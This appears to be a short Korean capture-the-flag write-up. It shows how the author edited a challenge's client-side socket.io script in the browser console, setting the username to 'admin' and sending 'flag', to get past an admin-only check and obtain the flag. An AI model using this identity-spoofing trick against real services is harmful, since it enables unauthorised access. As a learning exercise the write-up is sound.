    $(function () {
      var username = "guest";
      var socket = io();
      $('form').submit(function(e){
        e.preventDefault();
        socket.emit('cmd',username+":"+$('#m').val());
        $('#m').val('');
        return false;
      });
      socket.on('cmd', function(msg){
        $('#messages').append($('<li>').text(msg));
      });
    });
    
원래의 자바스크립트를 까보면 위의 내용이 나온다 
솔직히 맨 처음에는 console이 나와서 그에 맞는 명령어를 입력해주어야 되는 건가 싶어서 
이거 저거 하나씩 입력했었다 심지어 os.system까지 갔었다 
ls 등 여러 명령어를 입력하다가 이걸로는 뚫는 길이 없는 거 같아서 
위의 자바스크립트를 유심히 보았다 
간단히 변경해줄 수 있겠다 싶어서 
아래 내용으로 바꾸어서 개발자도구 콘솔에 입력해주었다 
    $(function () {
      var username = "admin";
      var socket = io();
      $('form').submit(function(e){
        e.preventDefault();
        socket.emit('cmd',username+":"+'flag');
        $('#m').val('');
        return false;
      });
      socket.on('cmd', function(msg){
        $('#messages').append($('<li>').text(msg));
      });
    });

그 후에 명령어 페이지에 flag를 쳤다 
admin Only라는 내용을 우회하고 플래그 값을 확보하였다 ㅎㅎ 
